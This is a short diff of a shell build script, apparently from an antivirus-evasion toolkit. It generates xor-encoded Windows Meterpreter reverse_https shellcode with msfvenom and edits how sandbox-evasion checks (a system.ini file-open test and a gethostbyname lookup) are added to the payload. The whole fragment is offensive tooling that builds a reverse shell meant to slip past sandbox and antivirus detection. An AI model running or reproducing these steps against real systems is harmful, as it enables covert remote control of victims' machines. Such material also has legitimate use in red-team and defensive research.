@@ -35,9 +35,8 @@ LHOST=$GLOBAL_LHOST
 msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f raw -a x64 --platform Windows > input/sc_raw.txt
 
 # add evasion techniques
-add_evasion fopen_sandbox_evasion
-printf "\n#define HOSTVALUE \"this.that\"" >> source/evasion/evasion.include
-add_evasion gethostbyname_sandbox_evasion
+add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
+add_evasion gethostbyname_sandbox_evasion 'this.that'
 reset_evasion_technique_counter
 
 # generate key file
